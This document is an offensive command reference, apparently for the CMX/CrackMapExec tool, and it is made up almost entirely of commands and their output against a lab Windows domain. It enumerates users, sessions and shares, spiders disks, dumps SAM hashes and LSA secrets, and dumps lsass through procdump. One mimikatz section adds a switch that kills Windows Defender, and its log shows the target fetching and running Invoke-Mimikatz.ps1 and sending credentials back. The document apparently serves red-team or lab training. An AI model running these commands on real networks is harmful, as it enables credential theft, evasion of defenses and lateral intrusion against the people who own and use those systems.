---
layout: default
title: Host Enum via SMB
---
# SMB: Host Recon Reference
Created by: @awsmhacks  
Updated: 3/25/20  
CMX Version: 0.0.1.azdev1


**Notes:**
* The following examples assume you have a Kali/Windows host connected to an internal network.

Host-Based Recon Sections  
  
1. [Local Users](#local-users)
2. [Logged On Users ](#logged-on-users)
3. [Local Sessions](#local-sessions)
4. [Local Groups](#enumerate-local-groups)
5. [Disks](#enumerate-disks)
6. [Shares and access](#enumerate-shares-and-access)
7. [Spidering Shares and Disks](#spidering-shares-and-disks)
8. [Getting Creds via Secretsdump](#extracting-credentials)
9. [Getting Creds via procdump](#extracting-credentials)
10. [Getting Creds via mimikatz](#extracting-credentials)
  
Need updates:  
X. [WMI Query Execution](#wmi-query-execution)
X. [Password Policy](#password-policy)  

------------------------------------------------------------------------
# Local Users

* Enumerate local users

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

```
> cmx smb 192.168.0.103 -u arianna -p User!23 -local-users
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A   [+] SWAMP\arianna:User!23
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A   [+] Local Users enumerated on 192.168.0.103 !
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A         Local User Accounts
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A      WIN7A\Administrator   :500
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A      WIN7A\agrande         :1000
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A      WIN7A\Guest           :501
```

------------------------------------------------------------------------
* Enumerate local users by bruteforcing RID

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | TRUE*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

```
> cmx smb 192.168.0.103 -u arianna -p User!23 --rid-brute
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A   [+] SWAMP\arianna:User!23
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A   [+] RID's enumerated on: 192.168.0.103
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A               RID Information
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A      WIN7A\Administrator   :500 (SidTypeUser)
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A      WIN7A\Guest           :501 (SidTypeUser)
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A      WIN7A\None            :513 (SidTypeGroup)
Mar.25.20 15:33:12  SMB      192.168.0.103  WIN7A      WIN7A\agrande         :1000 (SidTypeUser)
```











------------------------------------------------------------------------
# Logged On Users

* Enumerate logged on users

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | TRUE*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

Logged-on users are not the same as sessions!    
  
```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --loggedon
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A   [+] Loggedon-Users enumerated on 192.168.0.103 !
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A      arianna is currently logged on 192.168.0.103 (WIN7A)
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A      arianna is currently logged on 192.168.0.103 (WIN7A)
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A      WIN7A$ is currently logged on 192.168.0.103 (WIN7A)
```









------------------------------------------------------------------------
# Local Sessions

* Enumerate active sessions

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | TRUE*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

Sessions are not the same as logged-on users!

Example:  
```
> cmx smb 192.168.0.103 -u arianna -p User!23 --sessions
Mar.25.20 16:24:06  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:24:07  SMB      192.168.0.103  WIN7A   [+] SWAMP\arianna:User!23
Mar.25.20 16:24:07  SMB      192.168.0.103  WIN7A   [+] Sessions enumerated on 192.168.0.103 !
Mar.25.20 16:24:07  SMB      192.168.0.103  WIN7A      arianna has session originating from 192.168.0.149 on 192.168.0.103
```










------------------------------------------------------------------------
# Enumerate local groups

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | TRUE*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

```
> cmx smb 192.168.0.103 -u arianna -p User!23 --local-groups
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A   [+] SWAMP\arianna:User!23
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A   [+] Local Groups enumerated on: 192.168.0.103
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A              Local Group Accounts
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A      Group: None                  membercount: 3
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A      WIN7A\Administrator
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A      WIN7A\Guest
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A      WIN7A\agrande
```











------------------------------------------------------------------------
# Enumerate disks

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | TRUE*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}


```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --disks
Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A   [+] Disks enumerated on 192.168.0.103 !
Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A      Found Disk: C: \
Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A      Found Disk: D: \
```














------------------------------------------------------------------------
# Enumerate shares and access

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | TRUE*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

Attempts to authenticate to the target(s) and enumerate share access.

Example:  
Without Local Admin
```
> cmx smb 192.168.0.103 -u arianna -p User!23 --shares
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A   [+] SWAMP\arianna:User!23
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A   [+] Shares enumerated on: 192.168.0.103
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A      Share           Permissions     Remark
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A      -----           -----------     ------
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A      ADMIN$                          Remote Admin
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A      C$                              Default share
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A      IPC$                            Remote IPC
```
With local admin
```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --shares
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A   [+] Shares enumerated on: 192.168.0.103
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      Share           Permissions     Remark
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      -----           -----------     ------
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      ADMIN$          WRITE           Remote Admin
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      C$              WRITE           Default share
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      IPC$                            Remote IPC
```
*try it with null user/passwords for null access. -u '' -p ''*  
















--------------------------------------------------------------------------------------------------------------------------------------------------------
# Spidering Shares and Disks

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false*      | false       | TRUE*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

Options for spidering shares of remote systems.

Spider the C drive for files with txt in the name (finds both sometxtfile.html and somefile.txt)  
This example is ran from a windows host.  
Example:  
```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --spider C$ --pattern txt
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   Spidering C$.
Mar.25.20 16:37:07  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/DVD Maker/Shared/DvdStyles/Pets/Pets_notes-txt-background.png [lastm:'2019-12-23 11:51' size:7888]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceAmharic.txt [lastm:'2019-12-23 11:51' size:16212]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceArray.txt [lastm:'2019-12-23 11:51' size:1272822]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceDaYi.txt [lastm:'2019-12-23 11:51' size:980102]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceSimplifiedQuanPin.txt [lastm:'2019-12-23 11:51' size:1665878]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceSimplifiedShuangPin.txt [lastm:'2019-12-23 11:51' size:1445430][!]
```
Note: the '$' and '!' characters need to be escaped if you are using a bash shell(\*nix)  
```
> cmx smb 192.168.0.103 -u eminem -p Admin\!23 --spider C\$ --pattern txt
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   Spidering C$.
Mar.25.20 16:37:07  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/DVD Maker/Shared/DvdStyles/Pets/Pets_notes-txt-background.png [lastm:'2019-12-23 11:51' size:7888]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceAmharic.txt [lastm:'2019-12-23 11:51' size:16212]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceArray.txt [lastm:'2019-12-23 11:51' size:1272822]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceDaYi.txt [lastm:'2019-12-23 11:51' size:980102]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceSimplifiedQuanPin.txt [lastm:'2019-12-23 11:51' size:1665878]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceSimplifiedShuangPin.txt [lastm:'2019-12-23 11:51' size:1445430][!]
```












--------------------------------------------------------------------------------------------------------------------------------------------------------
# Extracting Credentials

Output for cred dumping commands are saved to the logs folder.   
Exact location is mentioned after the command.   
  
### \*Dump SAM hashes using methods from secretsdump.py 

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | TRUE*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --sam
Mar.25.20 16:49:35  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:49:35  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:49:35  SMB      192.168.0.103  WIN7A   [*] Dumping SAM hashes on 192.168.0.103
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A   [+] SAM hashes dump of 192.168.0.103
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A      Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A      agrande:1000:aad3b435b51404eeaad3b435b51404ee:710192d5abf367192c10a94d378bd45b:::
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A   [+] Added 3 SAM hashes to the database
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A   [+] Saved 3 hashes to ~\.cmx\logs/WIN7A_192.168.0.103_2020-03-25_164935.sam
```

------------------------------------------------------------------------
### \*Dump LSA secrets using methods from secretsdump.py 

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | TRUE*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

Sometimes you'll get plaintext passwords! (Usually service accounts).  
```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --lsa
Mar.25.20 16:50:45  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:50:45  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:50:45  SMB      192.168.0.103  WIN7A   [*] Dumping LSA Secrets on 192.168.0.103
Mar.25.20 16:50:47  SMB      192.168.0.103  WIN7A   [+] LSA Secrets dump for 192.168.0.103
Mar.25.20 16:50:47  SMB      192.168.0.103  WIN7A      SWAMP.LOCAL /drake:$DCC2$10240#drake#1fbd3853327bcefeaa7c666ba8e28004
Mar.25.20 16:50:47  SMB      192.168.0.103  WIN7A      SWAMP.LOCAL /arianna:$DCC2$10240#arianna#88e0a0e778e67d9e35748fa7e89ccaeb
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      SWAMP\WIN7A$:aes256-cts-hmac-sha1-96:fb04e5dd3627a764476e4f1d661942fe52579237ccc8237436a20e6b75216843
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      SWAMP\WIN7A$:aes128-cts-hmac-sha1-96:3c611b405b20f88e039e23b10624d41c
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      SWAMP\WIN7A$:des-cbc-md5:7a1340ea73e680ec
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      SWAMP\WIN7A$:aad3b435b51404eeaad3b435b51404ee:42d8cf1444bb879485532fea86c9e53e:::
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      dpapi_machinekey:0x6e27cf111a55495fd6aab7d4d3120ffb1b726fa4
dpapi_userkey:0x0cd38e83384273f6e20d629f17d9891f4b8e5f0d
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      NL$KM:825290be276dc54bee542f18d5b979e97e2da16102c30a44f40ea047b682cb48db90d23c2fc77970950f17192538d9c24ea67ac8187819d5bd3925be2ebc36cb
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A   [+] Saved 8 LSA secrets to ~\.cmx\logs/WIN7A_192.168.0.103_2020-03-25_165045.secrets
```

------------------------------------------------------------------------
### \*Procdump Method

CMX transfers procdump64.exe to the host, dumps lsass.exe, pulls the dump back (so you can work locally with it more if you want), and finally parses the dump via skelsec's pypykatz.  

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | TRUE*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}


```
# cmx smb 192.168.0.103 -u eminem -p Admin\!23 --dump
Mar.25.20 19:21:25  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 19:21:25  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 19:21:26  SMB      192.168.0.103  WIN7A   [*] Uploading procdump64
Mar.25.20 19:21:27  SMB      192.168.0.103  WIN7A   [*] Waiting for procdump to finish
Mar.25.20 19:21:36  SMB      192.168.0.103  WIN7A   [*] Downloading dump file to current directory
Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A   [+] Success, now cleaning up on target.
Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A      Results:
Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A       SWAMP\arianna:User!23
Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A       SWAMP\WIN7A$:42d8cf1444bb879485532fea86c9e53e
Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A       SWAMP\arianna:bbc2bf2fbca9dd9ed74d3c1b55e3d727

```


------------------------------------------------------------------------
### \*Mimikatz Method


|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | false*     |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

\* Note: Windows Defender might catch this, so be sure to add the -kd switch if you think defender is running.  
-kd = kill defender

```
# cmx smb 192.168.0.103 -u eminem -p Admin\!23 -kd -M mimikatz
Mar.25.20 19:19:00  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 19:19:00  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
            [!] Sleeping to allow defender process to finish shutting down[!] 
Mar.25.20 19:19:10  MIMIK...    192.168.0.103        - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
Mar.25.20 19:19:19  MIMIK...    192.168.0.103        - - "POST / HTTP/1.1" 200 -
Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\arianna:bbc2bf2fbca9dd9ed74d3c1b55e3d727
Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\WIN7A$:42d8cf1444bb879485532fea86c9e53e
Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\arianna:User!23
Mar.25.20 19:19:19  MIMIK...    192.168.0.103        [+] Added 3 credential(s) to the database
Mar.25.20 19:19:19  MIMIK...    192.168.0.103        Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_192.168.0.103_on_Mar.25.20_at_1919.log
```

.
.

.

.

.

.

.

.

.

.


Need to update command ref
------------------------------------------------------------------------
# Obtain password policy

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

```
#~ cmx smb 10.10.33.122 -u agrande -p User\!23 --pass-pol

Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 [+] OCEAN\agrande:User!23 
Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 [+] Dumping password info for domain: OCEAN
Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Minimum password length: 7
Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Password history length: 24
Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Maximum password age: 
Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Minimum password age: 
Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Reset Account Lockout Counter: 30 minutes 
Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Locked Account Duration: 30 minutes 
Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Account Lockout Threshold: 3
Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Forced Log off Time: Not Set

```
